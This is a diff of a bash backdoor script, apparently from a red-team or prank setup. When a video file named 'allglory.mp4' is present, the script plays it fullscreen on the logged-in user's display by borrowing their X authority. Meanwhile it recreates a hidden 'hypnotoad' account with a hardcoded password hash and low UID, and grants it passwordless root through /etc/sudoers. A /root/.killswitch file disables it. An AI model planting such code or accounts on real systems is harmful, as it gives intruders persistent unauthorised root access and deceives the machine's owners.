@@ -1,9 +1,23 @@
 #!/bin/bash
-if [ ! "$(getent passwd hypnotoad)" ]; then
-  PW_HASH='$6$yzr3XYmurAFOvtQR$HABJltXvmQbYlVd6k.3ClwU2.uIBJ/uDR8ias31ojciDacbat//zE1F3MIV3AZ1uiDgzIfUGQTbHrAtSTfQFu1'
-  useradd --create-home --password $PW_HASH --uid 500 --user-group hypnotoad
-fi
+if [[ ! -e /root/.killswitch ]]; then
+  if [ -e "/home/hypnotoad/Documents/allglory.mp4" ]; then
+    VIDEO="/home/hypnotoad/Documents/allglory.mp4"
+  else
+    VIDEO=$(find /tmp -name "allglory.mp4" -print -quit)
+  fi
 
-if [ ! "$(grep hypnotoad /etc/sudoers)" ]; then
-  echo "hypnotoad ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+  if [ -n "$VIDEO" ]; then
+    LOGGED_IN_USER=$(who | grep "(:0)" | cut -d' ' -f1)
+    export DISPLAY=:0; export XAUTHORITY=/home/$LOGGED_IN_USER/.Xauthority; mplayer -fs "$VIDEO"
+    
+    # Only recreate if there is a VIDEO to play while we do it
+    if [ ! "$(getent passwd hypnotoad)" ]; then
+      PW_HASH='$6$yzr3XYmurAFOvtQR$HABJltXvmQbYlVd6k.3ClwU2.uIBJ/uDR8ias31ojciDacbat//zE1F3MIV3AZ1uiDgzIfUGQTbHrAtSTfQFu1'
+      useradd --create-home --password $PW_HASH --uid 200 --gid 200 --user-group hypnotoad
+    fi
+
+    if [ ! "$(grep hypnotoad /etc/sudoers)" ]; then
+      echo "hypnotoad ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+    fi
+  fi
 fi
